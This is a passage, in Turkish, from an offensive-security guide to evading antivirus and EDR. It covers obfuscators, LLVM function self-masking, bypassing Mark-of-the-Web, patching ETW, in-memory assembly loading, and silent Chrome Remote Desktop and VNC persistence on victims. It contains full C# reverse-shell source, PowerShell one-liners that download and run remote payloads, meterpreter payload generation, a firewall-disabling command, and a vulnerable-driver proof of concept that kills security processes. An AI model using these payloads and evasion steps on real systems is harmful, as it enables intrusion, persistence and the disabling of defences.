4.  Manuel temizleme – ortaya çıkan binary'yi dnSpy'da çalıştırın ve *asıl* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğunlukla bunu `<Module>.byte_0` içinde başlatılan TLV kodlamalı bir byte dizisi olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya **gerek kalmadan** yürütme akışını yeniden oluşturur. Bu, çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak önceliklendirmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılabileceğini gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework'ü tarafından üretilen obfuscated işlemlerden oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, keyfi executable dosyalar için basit bir metamorphic code motorudur.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM destekli diller için ince ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code düzeyinde obfuscate eder ve böylece normal control flow hakkındaki doğal algımızı boşa çıkarır.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Tüm implantı yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend seçili fonksiyonları etkin olmadıkları sürece XOR ile maskeli tutabilir. Function Peekaboo PoC, demangle edilmiş adları `REG_` içeren fonksiyonları seçer, son machine code etrafına konumdan bağımsız giriş/çıkış stub'ları ekler ve `.text` içine paylaşılan tek bir masking handler yazar; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem instruction selection ve optimization sonrasında yapılmalıdır; çünkü dönüşümün **üretilen her return talimatını** kapsaması ve kesin x86 yerleşimini bilmesi gerekir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesi için bu talimatı siler ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return öncesindeki compiler-generated stack/frame teardown talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra üretilecek epilogue'u hedeflemesini sağlar; elle üretilen near `je` için `0F 84` baytlarını ve ardından dört baytlık `target - address_after_je` MC expression'ını yazın. Handler'a yapılan çağrılar ve atlamalar bunun yerine `MCInst` nesneleri (`CALL64pcrel32` ve `JMP_1`) olarak üretilebilir. Bir pass, hiçbir değişiklik yapmadığı seçilmemiş bir fonksiyon için `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoC, `.funcmeta` içine bir XOR key ve loader tarafından relocate edilmiş bir function pointer ile runtime length içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olmasına rağmen handler, kayıt içindeki `+8` offset'inde bir QWORD'a erişerek length ve padding alanını birlikte okur ve kayıtları `0x10` adımlarla ilerletir. PE section adları yalnızca sekiz bayt yer kapladığından runtime lookup `.funcmet` adını görür. Harici bir patcher, çalıştırılabilir bir `.stub` ekler, eski entry-point RVA değerini stub içinde saklar ve `AddressOfEntryPoint` değerini yeni konuma yönlendirir; PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` yoluyla alır, PE32+ imports tablosunu dolaşarak önceden import edilmiş bir `VirtualProtect` fonksiyonunu çözümler ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` konumuna bir sentinel yazar ve metadata'daki her fonksiyonu çağırır. Sürekli okunabilir olan prologue, fonksiyon başlangıcını `gs:[0xF0]` konumuna kaydeder, sentinel'ı algılar ve henüz maskelenmemiş body'yi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra, `[rsp+0x68]` konumundaki return address dönüştürülmüş fonksiyonun sonunu gösterir; böylece `end - start` hesaplanarak metadata kaydına yazılabilir. Tüm body'ler maskelendikten sonra stub sentinel'ı temizler ve `ImageBase + original_entry_point_RVA` konumuna atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, body'nin şifresini çözmek için aynı symmetric handler'ı çağırır. Son yol eklenmiş epilogue'a düşerken, önceki tüm return talimatları doğrudan paylaşılan handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı, çağıranın orijinal return address değerini kullanır ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

Handler mevcut kaydı bulur, sabit ve görünür prologue'u (`bu derlemede 0x46` bayt) atlar, geri kalan kısmın korumasını `PAGE_EXECUTE_READWRITE` olarak değiştirir, bu kısmı düşük key baytıyla bayt bayt XOR'lar ve ardından korumayı `PAGE_EXECUTE_READ` olarak ayarlar. Böylece aynı döngü girişte şifreyi çözer, her normal çıkışta ise yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın güçlü göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- çalıştırılabilir bir `.stub` içindeki entry point ve bir key ile relocate edilmiş `.text` pointer'larını tutan `.funcmet` section'ı;
- pre-CRT PEB, import-table ve section-table parsing işlemlerinin ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` konumlarına yazma işlemlerini, tekrarlanan `VirtualProtect` geçişlerinin ve image-backed çalıştırılabilir sayfalara yapılan bayt bazlı XOR yazma işlemlerinin izlemesi.

Bu, cryptographic protection değil, memory-scanner evasion'dır: patch uygulanmış dosyada orijinal, açık body hâlâ bulunur ve bir debugger, etkin fonksiyonu dump etmek için `VirtualProtect` veya XOR döngüsünde durabilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local olsa da değiştirilmiş code page'leri process genelinde etkilidir. Bu nedenle eşzamanlı veya recursive girişler, başka bir çağrı yürütülürken talimatların maskelenme durumunu tekrar değiştirebilir; exception'lar ve nonlocal exit'ler de yeniden maskelemenin atlanmasına yol açabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek korumayı geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve çalıştırılabilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, çalıştırılabilir kod değiştirildiğinde instruction-cache tutarlılığını sağlamanın çağıranın sorumluluğunda olduğunu açıkça belirtir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executable dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumak için tasarlanmış bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak itibara dayalı bir yaklaşım kullanır; yani nadir indirilen uygulamalar SmartScreen'i tetikler ve böylece son kullanıcı uyarılır, dosyayı çalıştırması engellenir (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar için otomatik olarak oluşturulur ve dosyanın indirildiği URL'yi de içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS değerinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** unutmamak önemlidir.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

İşte [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip SmartScreen'i bypass etme demosu.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesini** sağlayan güçlü bir Windows günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki sürecin **`EtwEventWrite`** işlevinin herhangi bir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen döndürülür ve böylece ilgili süreç için ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgi için **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerine bakabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun süredir biliniyor ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmanın hâlâ çok iyi bir yolu.

Payload diske dokunmadan doğrudan belleğe yükleneceğinden, tüm süreç için yalnızca AMSI'yi yamalamamız gerekir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunar; ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir feda edilebilir süreç başlatmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni sürece enjekte edip çalıştırmayı ve işiniz bittiğinde yeni süreci sonlandırmayı içerir. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eyleminizde bir şeyler ters giderse veya tespit edilirse implantınızın **hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Davranışsal Tespitler** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi sürecine** enjekte etmeyi içerir. Böylece yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz; ancak payload'unuz çalışırken bir şeyler ters giderse süreç çökebileceği için **beacon'ınızı kaybetme olasılığınız çok daha yüksek** olur.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek istiyorsanız şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'a ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'ın videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, güvenliği ihlal edilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında yüklü olan yorumlayıcı ortamına** erişim vererek diğer dillerde kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki yorumlayıcı binary'lerine ve ortama erişim izni vererek, güvenliği ihlal edilmiş makinenin belleğinde bu dillerde **keyfi kod çalıştırabilirsiniz**.

Depoda belirtildiğine göre Defender betikleri taramaya devam eder; ancak Go, Java, PHP vb. dillerden yararlanarak **statik imzaları bypass etme konusunda daha fazla esnekliğe** sahip oluruz. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell betikleriyle yapılan testler başarılı olmuştur.

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını değiştirir. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog gönderisinde**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın bilgisayarına Chrome Remote Desktop'ı dağıtıp ardından bilgisayarın kontrolünü ele geçirmek ve kalıcılığı sürdürmek kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine, ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Yükleyiciyi kurban makinede sessizce çalıştırın (yönetici yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp Next'e tıklayın. Sihirbaz yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Gerekli değişiklikleri yaparak verilen komutu çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi GUI kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion oldukça karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion teknikleri hakkında fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan başka bir harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi kısımları kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak binary'nin **bölümlerini**, Defender'ın **hangi kısmı** kötü amaçlı bulduğunu tespit edene kadar kaldırabilir ve bu kısmı size ayırmasını sağlayabilirsiniz.\
**Aynı işi yapan** başka bir araç da [**avred**](https://github.com/dobin/avred); bu hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık web üzerinden sunuyor.

### **Telnet Server**

Windows 10'a kadar tüm Windows sürümleri, (yönetici olarak) şu komutla yükleyebileceğiniz bir **Telnet server** ile geliyordu:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir** (stealth) ve güvenlik duvarını devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Şuradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni oluşturulan** _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın

#### **Reverse connection**

**Saldırgan**, reverse **VNC connection** yakalamaya **hazır** olmak için `vncviewer.exe -listen 5900` binary dosyasını kendi **host**'unda **çalıştırmalıdır**. Ardından **kurbanın** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için birkaç şey yapmamalısınız

- Zaten çalışıyorsa `winvnc`'i başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc`'i başlatmayın; aksi hâlde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi hâlde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Şuradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi **lister'ı** `msfconsole -r file.rc` ile **başlatın** ve **xml payload'ını** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender süreci çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# reverse shell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### Derleyici kullanarak C#

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve çalıştırma:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space'ten AV/EDR'yi Sonlandırma

Storm-2603, ransomware bırakmadan önce endpoint korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi savunmasız ama *imzalı* driver'ını** beraberinde getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bu driver'ı kötüye kullanır.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı driver**: Diske yazılan dosya `ServiceMouse.sys` olsa da, ikili dosya Antiy Labs'ın “System In-Depth Analysis Toolkit” paketindeki, yasal olarak imzalanmış `AToolsKrnl64.sys` driver'ıdır. Driver geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis yükleme**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı **kernel service** olarak kaydeder, ikinci satır ise onu başlatarak `\\.\ServiceMouse` yolunu userland'den erişilebilir hâle getirir.
3. **Driver tarafından sunulan IOCTL'ler**
   | IOCTL code | Yetenek                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID ile herhangi bir işlemi sonlandırma (Defender/EDR servislerini durdurmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Driver'ı kaldırma ve servisi silme |

   Minimal C PoC:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
